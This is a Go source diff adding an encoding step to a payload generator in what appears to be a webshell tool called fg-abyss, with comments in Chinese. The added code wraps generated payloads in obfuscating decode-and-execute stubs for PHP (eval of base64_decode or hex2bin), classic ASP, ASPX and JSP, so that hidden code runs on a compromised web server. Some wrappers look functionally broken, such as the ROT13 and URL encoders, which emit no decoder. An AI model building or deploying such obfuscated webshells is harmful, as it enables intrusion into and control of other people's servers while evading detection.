@@ -1,8 +1,11 @@
 package services
 
 import (
+	"encoding/base64"
+	"encoding/hex"
 	"fg-abyss/internal/domain/entity"
 	"fmt"
+	"net/url"
 	"os"
 	"path/filepath"
 )
@@ -36,6 +39,14 @@ func (g *PayloadGenerator) Generate(config *entity.PayloadConfig) (*entity.Paylo
 	content, err := g.templateService.RenderTemplate(tmpl.Name, config)
 	if err != nil {
 		return nil, fmt.Errorf("render template failed: %w", err)
+	}
+	
+	// 编码代码
+	if config.Encoder != "" && config.Encoder != "none" {
+		content, err = g.encodeCode(content, config.Encoder, string(config.Type))
+		if err != nil {
+			return nil, fmt.Errorf("encode failed: %w", err)
+		}
 	}
 	
 	// 混淆代码
@@ -185,6 +196,149 @@ func (g *PayloadGenerator) AddCustomTemplate(tmpl *entity.PayloadTemplate) error
 // RemoveCustomTemplate 移除自定义模板
 func (g *PayloadGenerator) RemoveCustomTemplate(name string) error {
 	return g.templateService.RemoveTemplate(name)
+}
+
+// encodeCode 编码代码
+func (g *PayloadGenerator) encodeCode(code string, encoder string, language string) (string, error) {
+	switch encoder {
+	case "base64":
+		return g.encodeBase64(code, language)
+	case "rot13":
+		return g.encodeROT13(code, language)
+	case "urlencode":
+		return g.encodeURL(code, language)
+	case "hex":
+		return g.encodeHex(code, language)
+	default:
+		return code, nil // 不支持的编码器返回原代码
+	}
+}
+
+// encodeBase64 Base64 编码
+func (g *PayloadGenerator) encodeBase64(code string, language string) (string, error) {
+	encoded := base64.StdEncoding.EncodeToString([]byte(code))
+	
+	// 根据语言生成不同的 Base64 解码包装器
+	switch language {
+	case "php":
+		// PHP: 使用 base64_decode + eval
+		return fmt.Sprintf(`<?php
+// Base64 编码的 Payload
+eval(base64_decode('%s'));
+?>`, encoded), nil
+	case "asp":
+		// ASP: 使用 VBScript Base64 解码函数
+		return fmt.Sprintf(`<%%
+' Base64 编码的 Payload
+Function DecodeBase64(ByVal strBase64)
+     Dim objDM, objXml, objNode
+     Set objDM = Server.CreateObject("MSXML2.DOMDocument")
+     Set objNode = objDM.createElement("b64")
+     objNode.DataType = "bin.base64"
+     objNode.Text = strBase64
+     DecodeBase64 = objNode.nodeTypedValue
+End Function
+Execute StrConv(DecodeBase64("%s"), vbUnicode)
+%%>`, encoded), nil
+	case "aspx":
+		// ASPX: 使用 System.Convert.FromBase64String
+		return fmt.Sprintf(`<%%@ Page Language="C#" Debug="true" %%>
+<script runat="server">
+protected void Page_Load(object sender, EventArgs e)
+{
+    try
+    {
+        // Base64 编码的 Payload
+        string encoded = "%s";
+        byte[] decoded = System.Convert.FromBase64String(encoded);
+        string code = System.Text.Encoding.UTF8.GetString(decoded);
+        // 执行代码
+        Server.Execute(code);
+    }
+    catch (Exception ex)
+    {
+        Response.Write("Error: " + ex.Message);
+    }
+}
+</script>`, encoded), nil
+	case "jsp":
+		// JSP: 使用 Base64 解码
+		return fmt.Sprintf(`<%%
+// Base64 编码的 Payload
+try {
+    String encoded = "%s";
+    byte[] decoded = java.util.Base64.getDecoder().decode(encoded);
+    String code = new String(decoded, "UTF-8");
+    Runtime.getRuntime().exec(code);
+} catch (Exception e) {
+    e.printStackTrace();
+}
+%%>`, encoded), nil
+	default:
+		return code, nil
+	}
+}
+
+// encodeROT13 ROT13 编码
+func (g *PayloadGenerator) encodeROT13(code string, language string) (string, error) {
+	encoded := payloadROT13Encode(code)
+	return fmt.Sprintf(`// ROT13 编码的 Payload
+// 注意：ROT13 是一种简单的替换加密，安全性较低
+%s`, encoded), nil
+}
+
+// encodeURL URL 编码
+func (g *PayloadGenerator) encodeURL(code string, language string) (string, error) {
+	encoded := payloadURLEncode(code)
+	return fmt.Sprintf(`// URL 编码的 Payload
+// 需要在服务器端解码
+%s`, encoded), nil
+}
+
+// encodeHex 十六进制编码
+func (g *PayloadGenerator) encodeHex(code string, language string) (string, error) {
+	encoded := payloadHexEncode(code)
+	switch language {
+	case "php":
+		return fmt.Sprintf(`<?php
+// 十六进制编码的 Payload
+eval(hex2bin('%s'));
+?>`, encoded), nil
+	default:
+		return fmt.Sprintf(`// 十六进制编码的 Payload
+%s`, encoded), nil
+	}
+}
+
+// 辅助函数：Base64 编码（Payload 专用）
+func payloadBase64Encode(data string) string {
+	return base64.StdEncoding.EncodeToString([]byte(data))
+}
+
+// 辅助函数：ROT13 编码（Payload 专用）
+func payloadROT13Encode(data string) string {
+	result := make([]byte, len(data))
+	for i := 0; i < len(data); i++ {
+		c := data[i]
+		if c >= 'A' && c <= 'Z' {
+			result[i] = 'A' + (c-'A'+13)%26
+		} else if c >= 'a' && c <= 'z' {
+			result[i] = 'a' + (c-'a'+13)%26
+		} else {
+			result[i] = c
+		}
+	}
+	return string(result)
+}
+
+// 辅助函数：URL 编码（Payload 专用）
+func payloadURLEncode(data string) string {
+	return url.QueryEscape(data)
+}
+
+// 辅助函数：十六进制编码（Payload 专用）
+func payloadHexEncode(data string) string {
+	return hex.EncodeToString([]byte(data))
 }
 
 // Preview 预览生成的 Payload
